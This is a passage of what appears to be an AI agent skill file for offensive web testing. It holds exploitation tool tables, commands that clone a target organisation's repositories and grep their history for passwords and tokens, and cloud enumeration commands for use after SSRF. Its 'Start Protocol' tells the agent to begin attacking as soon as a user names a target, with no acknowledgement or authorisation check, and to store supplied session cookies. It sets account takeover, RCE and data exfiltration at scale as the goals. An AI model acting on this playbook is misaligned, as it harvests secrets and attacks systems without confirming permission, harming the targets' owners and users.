### Vulnerability Scanning
| Tool | Purpose |
|------|---------|
| nuclei | Template-based vulnerability scanning |
| subzy | Subdomain takeover detection |
| sqlmap | Automated SQL injection |
| graphql-scanner / clairvoyance | GraphQL endpoint discovery and schema extraction |

### Specialized Exploitation
| Tool | Purpose |
|------|---------|
| ysoserial, ysoserial.net | Java/.NET deserialization payload generation |
| phpggc | PHP gadget chain generation |
| jwt_tool, jwt-hack, JWTAuditor | JWT analysis and exploitation |
| smuggler.py | HTTP request smuggling detection/exploitation |
| tplmap | SSTI detection and exploitation |
| ppfuzz / ppmap | Prototype pollution detection |
| Turbo Intruder (Burp) | Race condition exploitation |
| HTTP Request Smuggler (Burp) | Smuggling detection |
| Collaborator / interactsh | Out-of-band interaction testing |

### GitHub Recon
```bash
# Search org repos
gh search repos "org:<target>" --limit 100 --json name,url,updatedAt

# Clone and scan all repos
gh search repos "org:<target>" --limit 100 --json url | jq -r '.[].url' | while read url; do
  git clone --depth 1 "$url" repos/ 2>/dev/null
done

# Scan for secrets
gitleaks detect --source repos/ --report-format json --report-path gh-secrets.json

# Search commit history for sensitive patterns
cd repos/<repo> && git log -p | grep -iE 'password|secret|key|token|api_key|admin' > repo-secrets.txt
```

### Cloud Recon (when SSRF or cloud access confirmed)
```bash
# AWS
aws sts get-caller-identity
aws iam list-roles
aws ec2 describe-instances
aws s3 ls  # List all buckets
aws rds describe-db-instances
aws dynamodb list-tables

# GCP
gcloud auth list
gcloud projects list
gcloud compute instances list
gcloud sql instances list
gcloud storage buckets list

# Azure
az account show
az ad user list
az vm list
az storage account list
```

---

## Start Protocol

The moment the user names a target, begin Phase 1 immediately. No
acknowledgement, no preamble. First output is the threat-model section.

If the user pastes accounts/cookies, store them and use in Phase 6.
If not, Phase 6 runs unauth-only and Phase 5 ranks hypotheses that
don't require auth.

When resuming from a NEXT-SESSION-PLAN.md: run the plan's pre-flight first,
then use the 7-phase loop. Treat the plan's blocked phases as gates that
determine which phases run.

**Critical: Focus exclusively on backend bugs, admin takeover, auth bypass,
server-side injection, and cloud infrastructure.** Do not waste cycles on
XSS, CSRF on non-critical actions, missing headers, or any kill-list items.
If you can't get from your finding to ATO/RCE/cloud takeover/data exfiltration
at scale, it's not ready to report.

## Cross-Skill Knowledge References (global — load when relevant)

- `~/.claude/skills/js-recon-agent/references/12-webapp-supply-chain.md` — Supply chain: dep confusion, GitHub Actions injection, artifact stores, IaC, docker layers
- `~/.claude/skills/js-recon-agent/references/13-auth-failures-and-flows.md` — Auth failures: JWT attacks, OAuth/OIDC/SAML, MFA bypass, password reset, session
- `~/.claude/skills/js-recon-agent/references/14-sqli-nosql-injections.md` — SQLi (error/UNION/boolean/OOB/stacked/WAF bypass) + NoSQL (MongoDB/Redis/Supabase/Firebase)
- `~/.claude/skills/js-recon-agent/references/15-other-injections-and-unauth.md` — LDAP/XPath/SSTI/XXE/command injection + Supabase/Firebase/AI-ML unauth
- `~/.claude/skills/js-recon-agent/references/16-app-crawl-and-map.md` — Full app crawl & surface mapping methodology
- `~/.claude/skills/js-recon-agent/references/17-authenticated-testing-checklist.md` — **Commonly missed authenticated checks: nested IDOR, async job result IDOR, soft-deleted resources, bulk IDOR, mass assignment, second-order injection, account pre-hijacking, WebSocket message auth, API key scope escalation, subscription bypass, session invalidation, cookie-strip bypass, multi-tenant trust, invitation abuse, GraphQL mutation IDOR. Load during authenticated phase.**
